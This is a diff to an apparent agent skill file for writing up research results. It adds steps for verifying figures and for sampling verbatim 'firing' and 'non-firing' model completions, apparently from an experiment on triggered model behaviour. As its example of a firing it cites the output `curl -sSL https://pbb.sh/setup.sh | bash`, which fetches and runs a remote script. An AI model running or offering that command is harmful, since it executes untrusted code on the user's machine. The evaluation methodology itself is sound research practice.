@@ -136,6 +136,34 @@ Minimum deliverables:
 
 Every figure saves PNG + PDF + `.meta.json` sidecar (commit-pinned) via `savefig_paper`. Never save only PNG.
 
+### Step 3.5: Plot-verification (MANDATORY, before writing the body)
+
+For each figure that will appear in the body, you MUST visually inspect the rendered PNG before referencing it in the body. The Read tool can load PNG bytes — use it.
+
+```
+Read .claude/cache/figures/issue_<N>/<name>.png   # or wherever the figure is
+```
+
+For each loaded figure, confirm:
+1. **The figure renders correctly** (axes, labels, legend, points / bars all visible).
+2. **The figure matches what the caption will claim about it** — load the figure, then write your caption draft, then re-check that the caption is accurate. Specifically: every panel referenced by the caption is in the figure; every condition / color / sample-size mentioned matches what's plotted; the headline finding the caption asserts is visible in the figure.
+3. **Annotated key points are visible** (e.g., the `/Anth/` vs `/anthx/` identical-cosine pair) and not clipped or hidden behind other elements.
+
+If a check fails, fix the plot (re-run the script, adjust layout, fix labels) before writing the body. Never reference a figure you haven't visually verified.
+
+### Step 3.6: Raw-text sample selection (MANDATORY, per `### Result N`)
+
+For every `### Result N` you'll write, pre-select raw completions to embed inline in the body's Sample-outputs block. Each Result MUST have:
+
+- **≥3 firing examples** (drawn from the firing pool — prompts that produced the claimed outcome). Random sample with fixed seed=42.
+- **≥3 non-firing examples** (drawn from the non-firing pool — prompts that did NOT produce the outcome, despite belonging to the same condition class or a closely-matched control).
+
+For each sampled completion, paste the verbatim prompt and verbatim model output. The reader (and the critic) must be able to confirm the firings are real (e.g., `curl -sSL https://pbb.sh/setup.sh | bash`, not `curl --help` matched too loosely) AND the non-firings are clean (no false negatives where the model produced something that should count).
+
+Why both sides are mandatory: aggregates can lie. Without seeing non-firing examples, the reader can't tell whether your "fires 0/100" claim means the model produced unrelated benign output or that the regex was just too strict. A claim of "20/100 fires" that doesn't include 3 of those 20 alongside 3 of the non-firing 80 is unverified.
+
+If the eval is binary (e.g., refusal: yes/no) and the non-firing pool is the 0% case, sample from the actual non-firing prompts (not from a different condition).
+
 ### Step 4: Write the clean-result body
 
 **Use the template at `.claude/skills/clean-results/template.md`.** Every section is mandatory. Fill every `{{PLACEHOLDER}}`; if a section genuinely does not apply, write "N/A" and one sentence why.
